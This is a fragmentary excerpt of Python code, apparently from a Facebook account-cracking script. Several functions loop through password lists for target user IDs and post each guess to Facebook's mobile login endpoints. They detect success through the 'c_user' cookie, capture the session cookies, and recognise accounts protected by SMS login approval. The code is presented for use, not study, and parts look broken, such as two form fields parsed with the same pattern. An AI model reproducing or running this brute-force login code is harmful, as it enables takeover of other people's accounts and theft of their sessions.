...
def x(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'accept-language': 'en-US,en;q=0.9',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://d.facebook.com/login/device-based/validate-password/?shbl=0"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
...
def freeq(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'accept-language': 'en-US,en;q=0.9',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://touch.facebook.com/login/device-based/validate-password/?shbl=0"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
...
def d(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            "jazoest":(match := re.search(r'name="m_ts" value="(.*?)"', str(free_fb))) and match.group(1),
            "lsd":(match := re.search(r'name="m_ts" value="(.*?)"', str(free_fb))) and match.group(1)}
            print(f"{data}")
            headers = {
            'Host': 'touch.facebook.com',
            'x-fb-rlafr': '0',
